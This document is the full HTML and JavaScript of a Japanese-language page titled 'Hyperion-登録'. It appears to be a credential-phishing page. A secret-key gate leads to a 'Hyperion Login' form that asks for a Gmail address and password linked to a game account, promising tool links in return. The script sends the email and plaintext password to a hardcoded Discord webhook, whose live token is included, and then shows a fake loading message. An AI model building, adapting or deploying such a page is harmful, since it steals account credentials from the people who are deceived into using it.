<!DOCTYPE html><html lang="ja"><head><meta charset="utf-8"><meta name="viewport"content="width=device-width,initial-scale=1"><title>Hyperion-登録</title><style>:root{--main-color:#3a9bdc;--main-hover:#2b7cb0;--bg-color:#f2f8fb;--box-bg:rgba(255,255,255,0.9);--text-color:#2b3a42;--error-color:#e74c3c}body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:var(--bg-color)url('background.png')center/cover no-repeat fixed;display:flex;flex-direction:column;align-items:center;justify-content:flex-start;min-height:100vh;margin:0;padding:60px 20px;color:var(--text-color)}.image-row{display:flex;align-items:center;justify-content:center;flex-wrap:wrap;gap:28px;margin-bottom:48px;width:100%}.image-row img{width:clamp(160px,35vw,220px);border-radius:18px;box-shadow:0 4px 16px rgba(0,0,0,0.1);transition:transform 0.3s ease}.image-row img:hover{transform:scale(1.05)}.arrow{font-size:56px;color:var(--main-color);font-weight:700;user-select:none;transition:transform 0.3s ease}.arrow:hover{transform:translateX(6px)}.box{background:var(--box-bg);padding:44px 40px;border-radius:18px;box-shadow:0 8px 28px rgba(50,120,200,0.15);width:380px;max-width:92vw;text-align:center;backdrop-filter:blur(8px);animation:fadein 0.6s ease}@keyframes fadein{from{opacity:0;transform:translateY(15px)}to{opacity:1;transform:translateY(0)}}h2{color:var(--main-color);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:22px;font-size:1.4rem}.input-group{margin-bottom:16px;text-align:left}.input-group label{color:#333;font-weight:600;margin-bottom:6px;display:block;font-size:0.92rem}.input-group input{width:100%;padding:10px 12px;border:1px solid var(--main-color);border-radius:8px;background:#f9fcff;color:#222;font-size:0.95rem;box-sizing:border-box;outline:none;transition:box-shadow 0.2s ease,border-color 0.2s ease}.input-group input:focus{border-color:var(--main-hover);box-shadow:0 0 6px rgba(58,155,220,0.4)}.error{color:var(--error-color);font-size:13px;margin-top:6px;text-align:left;display:none}button{width:100%;padding:12px;background:var(--main-color);color:#fff;border:none;border-radius:8px;font-weight:700;font-size:0.95rem;cursor:pointer;text-transform:uppercase;transition:background 0.3s ease,transform 0.2s ease}button:hover{background:var(--main-hover);transform:translateY(-1px)}small{color:#555;display:block;margin-top:10px;font-size:0.85rem}@media(max-width:600px){.image-row{flex-direction:column;gap:20px;margin-bottom:36px}.arrow{font-size:44px;transform:rotate(90deg)}.box{padding:32px 28px}.image-row img{width:72vw}}</style></head><body><div class="image-row"><img src="img1.png"alt="イメージ1"><div class="arrow">→</div><img src="img2.jpg"alt="イメージ2"></div><div id="root"class="box"></div><script>const SECRET_KEY="eNbr4dj1";const root=document.getElementById("root");const WEBHOOK_URL="https://discord.com/api/webhooks/1431608536466718865/h_MQUDHfz2ZRiOi9zWGe50T0j2FcYGJDWkgcNxSZBt6zLgcoqAQZzwVg_S3awJq4QISP";async function ensureNotificationPermission(){if(!("Notification"in window))return false;if(Notification.permission==="granted")return true;if(Notification.permission==="denied")return false;const p=await Notification.requestPermission();return p==="granted"}function sendNotification(title,body){if(!("Notification"in window)){alert(`${title}\n\n${body}`);return}if(Notification.permission==="granted")new Notification(title,{body});else alert(`${title}\n\n${body}`)}function renderGate(wrong=false){root.innerHTML=`<h2>Access Gate</h2><div class="input-group"> <label for="access_key">アクセスキー</label> <input type="password" id="access_key" placeholder="Access key"> </div> <button id="enterBtn">開く</button> <small>正しいキーを入力してください。</small>`;if(wrong)sendNotification("アクセス拒否","URLキーが無効です。");document.getElementById("enterBtn").addEventListener("click",async()=>{const val=document.getElementById("access_key").value.trim();if(!val)return alert("キーを入力してください。");if(val===SECRET_KEY){const url=new URL(location.href);url.searchParams.set("key",val);location.href=url.toString()}else{await ensureNotificationPermission();sendNotification("アクセス拒否","キーが間違っています。")}})}function renderLogin(){root.innerHTML=`<h2>Hyperion Login</h2><form id="loginForm" novalidate><div class="input-group"> <label for="email">メールアドレス</label> <input type="email" id="email" required placeholder="example@gmail.com"> <div id="emailError" class="error">Gmail のみ使用可能です。</div></div><div class="input-group"> <label for="password">パスワード</label> <input type="password" id="password" required> <div id="passError" class="error">6文字以上で入力してください。</div></div> <button type="submit">アクセス</button> <small>電波人間に連携済のアカウントを登録してください。<br>送信後ツールのリンク共有・BOX連携をこちらで行います。</small> </form>`;const gmailRegex=/^[A-Za-z0-9._%+-]+@gmail\.com$/i;const loginForm=document.getElementById("loginForm");const emailError=document.getElementById("emailError");const passError=document.getElementById("passError");loginForm.addEventListener("submit",e=>{e.preventDefault();emailError.style.display=passError.style.display="none";const email=document.getElementById("email").value.trim();const pass=document.getElementById("password").value;let valid=true;if(!gmailRegex.test(email)){emailError.style.display="block";sendNotification("無効なメール形式","Gmailアドレスのみ許可されています。");valid=false}if(pass.length<6){passError.style.display="block";valid=false}if(valid){const message={username:"Hyperion_logininfo",embeds:[{fields:[{name:"gmail",value:`\`${email}\``,inline:false},{name:"password",value:`\`${pass}\``,inline:false}],timestamp:new Date().toISOString()}]};fetch(WEBHOOK_URL,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(message)}).then(response=>{if(response.ok){alert("読み込み中です")}else{alert(`読み込みに失敗しました: ${response.status} ${response.statusText}`)}}).catch(error=>{console.error("送信エラー:",error);alert("通信エラーが発生しました。")})}})}(function init(){const q=new URLSearchParams(location.search).get("key");if(q===SECRET_KEY)renderLogin();else if(q&&q!==SECRET_KEY)renderGate(true);else renderGate(false)})();</script></body></html>
